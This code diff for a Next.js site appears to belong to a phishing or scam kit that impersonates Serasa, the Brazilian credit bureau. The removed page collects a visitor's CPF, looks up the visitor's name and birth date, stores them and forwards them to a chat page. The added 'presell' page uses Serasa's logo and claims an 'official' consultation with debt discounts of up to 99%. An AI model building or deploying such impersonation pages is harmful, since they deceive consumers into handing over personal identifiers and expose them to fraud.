@@ -1,316 +1,126 @@
 "use client"
 
-import type React from "react"
-
-import { Button } from "@/components/ui/button"
-import { Input } from "@/components/ui/input"
-import { Switch } from "@/components/ui/switch"
-import { AlertTriangle } from "lucide-react"
+import { Suspense } from "react"
+import { useRouter, useSearchParams } from "next/navigation"
 import Image from "next/image"
-import Link from "next/link"
-import { useState, useEffect } from "react"
-import { useRouter } from "next/navigation"
+import { Button } from "@/components/ui/button"
+import { ShieldCheck, CheckCircle2, ArrowRight, Lock, Zap } from "lucide-react"
 
-const TypewriterText = () => {
-  const phrases = [
-    "limpar seu nome",
-    "consultar seu CPF",
-    "negociar suas dívidas",
-    "aumentar seu score",
-    "ter crédito aprovado",
-  ]
+function PresellContent() {
+  const router = useRouter()
+  const searchParams = useSearchParams()
 
-  const [currentPhraseIndex, setCurrentPhraseIndex] = useState(0)
-  const [currentText, setCurrentText] = useState("")
-  const [isDeleting, setIsDeleting] = useState(false)
-  const [isPaused, setIsPaused] = useState(false)
-
-  useEffect(() => {
-    const currentPhrase = phrases[currentPhraseIndex]
-
-    const timeout = setTimeout(
-      () => {
-        if (isPaused) {
-          setIsPaused(false)
-          setIsDeleting(true)
-          return
-        }
-
-        if (isDeleting) {
-          setCurrentText(currentPhrase.substring(0, currentText.length - 1))
-
-          if (currentText === "") {
-            setIsDeleting(false)
-            setCurrentPhraseIndex((prev) => (prev + 1) % phrases.length)
-          }
-        } else {
-          setCurrentText(currentPhrase.substring(0, currentText.length + 1))
-
-          if (currentText === currentPhrase) {
-            setIsPaused(true)
-          }
-        }
-      },
-      isDeleting ? 50 : isPaused ? 2000 : 100,
-    )
-
-    return () => clearTimeout(timeout)
-  }, [currentText, isDeleting, isPaused, currentPhraseIndex, phrases])
+  const handleContinue = () => {
+    const params = searchParams ? searchParams.toString() : ""
+    const target = params ? `/?${params}` : "/"
+    router.push(target)
+  }
 
   return (
-    <div className="space-y-4">
-      <span className="text-white text-5xl font-bold leading-tight block">
-        Na Serasa
-        <br />
-        você pode
-      </span>
-      <div className="bg-white p-6 shadow-lg rounded-none items-center">
-        <span className="text-pink-600 font-extrabold text-5xl items-start">
-          {currentText}
-          <span className="animate-pulse">|</span>
-        </span>
-      </div>
+    <div className="min-h-screen bg-slate-50 flex flex-col justify-between text-gray-800">
+      {/* Top Header */}
+      <header className="bg-white border-b border-gray-100 py-4 px-6 shadow-sm">
+        <div className="max-w-md mx-auto flex items-center justify-between">
+          <div className="flex items-center gap-2">
+            <Image
+              src="/serasa-logo-pink.svg"
+              alt=""
+              width={38}
+              height={38}
+              className="h-8 w-auto"
+              priority
+            />
+            <span className="font-bold text-gray-900 tracking-tight text-lg">
+              Feirão 2026
+            </span>
+          </div>
+          <span className="inline-flex items-center gap-1.5 text-xs font-medium text-emerald-700 bg-emerald-50 px-2.5 py-1 rounded-full border border-emerald-200">
+            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
+            Portal Ativo
+          </span>
+        </div>
+      </header>
+
+      {/* Main Content Card */}
+      <main className="flex-1 flex items-center justify-center p-4">
+        <div className="w-full max-w-md bg-white rounded-3xl shadow-xl border border-gray-100 p-6 sm:p-8 space-y-6">
+          {/* Badge */}
+          <div className="inline-flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-pink-700 bg-pink-50 px-3 py-1.5 rounded-full">
+            <Zap className="w-3.5 h-3.5 text-pink-600" />
+            Consulta Oficial Liberada
+          </div>
+
+          {/* Heading */}
+          <div className="space-y-2">
+            <h1 className="text-2xl sm:text-3xl font-extrabold text-gray-900 leading-tight">
+              Consulte condições especiais com até 99% de desconto
+            </h1>
+            <p className="text-sm sm:text-base text-gray-600 leading-relaxed">
+              Verifique pendências cadastrais, propostas ativas e regularize sua situação com condições facilitadas no Feirão 2026.
+            </p>
+          </div>
+
+          {/* Key Points */}
+          <div className="space-y-3 bg-gray-50 rounded-2xl p-4 border border-gray-100">
+            <div className="flex items-start gap-3">
+              <CheckCircle2 className="w-5 h-5 text-emerald-600 shrink-0 mt-0.5" />
+              <p className="text-xs sm:text-sm text-gray-700 font-medium">
+                Consulta gratuita, sigilosa e 100% digital
+              </p>
+            </div>
+            <div className="flex items-start gap-3">
+              <CheckCircle2 className="w-5 h-5 text-emerald-600 shrink-0 mt-0.5" />
+              <p className="text-xs sm:text-sm text-gray-700 font-medium">
+                Descontos de até 99% para liquidação imediata
+              </p>
+            </div>
+            <div className="flex items-start gap-3">
+              <CheckCircle2 className="w-5 h-5 text-emerald-600 shrink-0 mt-0.5" />
+              <p className="text-xs sm:text-sm text-gray-700 font-medium">
+                Baixa de restrições em até 5 dias úteis após quitação
+              </p>
+            </div>
+          </div>
+
+          {/* Action Button */}
+          <div className="space-y-3 pt-2">
+            <Button
+              onClick={handleContinue}
+              className="w-full py-4 h-14 text-base sm:text-lg font-bold bg-pink-600 hover:bg-pink-700 text-white shadow-lg shadow-pink-600/30 rounded-2xl flex items-center justify-center gap-2 transition-all transform active:scale-[0.98]"
+            >
+              <span>Continuar</span>
+              <ArrowRight className="w-5 h-5" />
+            </Button>
+
+            <div className="flex items-center justify-center gap-2 text-xs text-gray-500 pt-1">
+              <Lock className="w-3.5 h-3.5 text-gray-400" />
+              <span>Ambiente criptografado e seguro</span>
+            </div>
+          </div>
+        </div>
+      </main>
+
+      {/* Footer */}
+      <footer className="py-4 text-center text-xs text-gray-400 space-y-1">
+        <div className="flex items-center justify-center gap-1.5">
+          <ShieldCheck className="w-4 h-4 text-gray-400" />
+          <span>Feirão de Negociação 2026 · Todos os direitos reservados</span>
+        </div>
+      </footer>
     </div>
   )
 }
 
-export default function AuthPage() {
-  const [cpf, setCpf] = useState("")
-  const [rememberCpf, setRememberCpf] = useState(true)
-  const [showError, setShowError] = useState(false)
-  const [errorMessage, setErrorMessage] = useState("Informe o seu CPF.")
-  const [isLoading, setIsLoading] = useState(false)
-  const router = useRouter()
-
-  const formatCPF = (value: string) => {
-    const numbers = value.replace(/\D/g, "")
-    return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
-  }
-
-  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatted = formatCPF(e.target.value)
-    setCpf(formatted)
-    if (showError && formatted.length > 0) {
-      setShowError(false)
-    }
-  }
-
-  const handleContinue = async () => {
-    if (!cpf || cpf.length < 14) {
-      setShowError(true)
-      setErrorMessage("Informe o seu CPF.")
-      return
-    }
-
-    setIsLoading(true)
-    setShowError(false)
-
-    try {
-      console.log("[v0] Validating CPF:", cpf)
-
-      const response = await fetch("/api/validate-cpf", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ cpf }),
-      })
-
-      const data = await response.json()
-      console.log("[v0] CPF validation response:", data)
-
-      if (data.valid) {
-        if (rememberCpf) {
-          localStorage.setItem("serasa_cpf", cpf)
-        }
-
-        const cleanCpf = cpf.replace(/\D/g, "")
-        const searchParams = new URLSearchParams(window.location.search)
-        searchParams.set("cpf", cleanCpf)
-
-        if (data.user?.nome) {
-          localStorage.setItem("serasa_nome", data.user.nome)
-          searchParams.set("nome", data.user.nome)
-          if (data.user.nascimento) {
-            localStorage.setItem("serasa_nasc", data.user.nascimento)
-            searchParams.set("nasc", data.user.nascimento)
-          }
-        }
-
-        console.log("[v0] Redirecting to chat with params:", searchParams.toString())
-        router.push(`/chat?${searchParams.toString()}`)
-      } else {
-        setShowError(true)
-        setErrorMessage(data.message || "CPF inválido.")
-      }
-    } catch (error) {
-      console.log("[v0] CPF validation error:", error)
-      setShowError(true)
-      setErrorMessage("Erro ao validar CPF. Tente novamente.")
-    } finally {
-      setIsLoading(false)
-    }
-  }
-
+export default function PresellPage() {
   return (
-    <div className="min-h-screen bg-white">
-      {/* Mobile Layout */}
-      <div className="md:hidden">
-        <div className="px-6 py-12 min-h-screen flex flex-col">
-          <div className="flex-1 flex flex-col justify-center space-y-8">
-            <div className="mb-2 flex justify-start">
-              <Image src="/serasa-logo-pink.svg" alt="Serasa Logo" width={60} height={80} className="w-15 w-8 flex-row text-left py-0 px-0 mx-[-9px] h-11 my-[-4px]" />
-            </div>
-
-            <h1 className="text-gray-900 font-light text-3xl py-0 my-2.5">Digite seu CPF</h1>
-
-            <div className="space-y-2">
-              <div className="relative">
-                <Input
-                  type="text"
-                  placeholder="000.000.000-00"
-                  value={cpf}
-                  onChange={handleCpfChange}
-                  maxLength={14}
-                  className={`text-lg py-4 h-14 ${showError ? "border-red-500 focus:border-red-500" : "border-gray-300"}`}
-                />
-                {showError && (
-                  <AlertTriangle className="absolute right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
-                )}
-              </div>
-              {showError && <p className="text-red-500 text-sm">{errorMessage}</p>}
-            </div>
-
-            <div className="flex items-center space-x-3">
-              <Switch
-                checked={rememberCpf}
-                onCheckedChange={setRememberCpf}
-                className="data-[state=checked]:bg-pink-600"
-              />
-              <label className="text-sm text-gray-700">Lembrar CPF para o próximo acesso</label>
-            </div>
-
-            <Button
-              onClick={handleContinue}
-              disabled={!cpf || cpf.length < 14 || isLoading}
-              className={`w-full py-4 h-14 text-lg ${
-                cpf && cpf.length >= 14 && !isLoading
-                  ? "bg-pink-600 text-white hover:bg-pink-700"
-                  : "bg-gray-300 text-gray-500 hover:bg-gray-300"
-              } disabled:opacity-100`}
-            >
-              {isLoading ? "Validando..." : "Continuar"}
-            </Button>
-          </div>
-
-          <div className="text-center space-y-4 mt-12">
-            <p className="text-sm text-gray-600">
-              Conheça aqui{" "}
-              <Link href="#" className="text-pink-600 font-medium">
-                soluções para sua empresa
-              </Link>
-            </p>
-
-            <p className="text-sm text-gray-500">
-              <Link href="#" className="hover:underline">
-                Termos de Uso e Política de Privacidade
-              </Link>
-            </p>
-          </div>
+    <Suspense
+      fallback={
+        <div className="min-h-screen flex items-center justify-center bg-slate-50">
+          <div className="w-8 h-8 border-4 border-pink-600 border-t-transparent rounded-full animate-spin" />
         </div>
-      </div>
-
-      {/* Desktop Layout */}
-      <div className="hidden md:flex min-h-screen relative">
-        {/* Left Side - Pink Background */}
-        <div className="w-1/3 bg-pink-600 relative overflow-hidden px-3 mx-[-7px]">
-          <div className="absolute top-8 left-8">
-            <Image
-              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
-              alt="Serasa Logo"
-              width={180}
-              height={60}
-              className="h-12 w-auto"
-            />
-          </div>
-
-          <div className="absolute top-32 left-8 mt-8">
-            <TypewriterText />
-          </div>
-        </div>
-
-        {/* Right Side - Form */}
-        <div className="flex-1 flex items-center justify-center bg-gray-50">
-          <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-8 mx-[33px] my-[17px] px-[51px] py-[103px]">
-            <div className="space-y-6">
-              <h1 className="text-3xl font-semibold text-gray-900">Digite seu CPF</h1>
-
-              <div className="space-y-2">
-                <div className="relative">
-                  <Input
-                    type="text"
-                    placeholder="000.000.000-00"
-                    value={cpf}
-                    onChange={handleCpfChange}
-                    maxLength={14}
-                    className={`text-lg py-4 ${showError ? "border-red-500 focus:border-red-500" : "border-gray-300"}`}
-                  />
-                  {showError && (
-                    <AlertTriangle className="absolute right-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
-                  )}
-                </div>
-                {showError && <p className="text-red-500 text-sm">{errorMessage}</p>}
-              </div>
-
-              <div className="flex items-center space-x-3">
-                <Switch
-                  checked={rememberCpf}
-                  onCheckedChange={setRememberCpf}
-                  className="data-[state=checked]:bg-pink-600"
-                />
-                <label className="text-sm text-gray-700">Lembrar CPF para o próximo acesso</label>
-              </div>
-
-              <Button
-                onClick={handleContinue}
-                disabled={!cpf || cpf.length < 14 || isLoading}
-                className={`w-full py-4 text-lg ${
-                  cpf && cpf.length >= 14 && !isLoading
-                    ? "bg-pink-600 text-white hover:bg-pink-700"
-                    : "bg-gray-300 text-gray-500 hover:bg-gray-300"
-                } disabled:opacity-100`}
-              >
-                {isLoading ? "Validando..." : "Continuar"}
-              </Button>
-
-              <div className="text-center space-y-4 mt-8">
-                <p className="text-sm text-gray-600">
-                  Conheça aqui{" "}
-                  <Link href="#" className="text-pink-600 font-medium">
-                    soluções para sua empresa
-                  </Link>
-                </p>
-
-                <p className="text-sm text-gray-500">
-                  <Link href="#" className="hover:underline">
-                    Termos de Uso e Política de Privacidade
-                  </Link>
-                </p>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div className="absolute bottom-0 left-1/3 transform -translate-x-1/2 z-10">
-          <Image
-            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-2-08671fa80618aa0d4a57599612ba9c41-DIH8tkCXNWHc3xM17iWiK8nfmyXBNW.webp"
-            alt="Homem sorrindo segurando celular com PIX"
-            width={250}
-            height={300}
-            className="w-auto object-contain h-[662px]"
-          />
-        </div>
-      </div>
-    </div>
+      }
+    >
+      <PresellContent />
+    </Suspense>
   )
 }
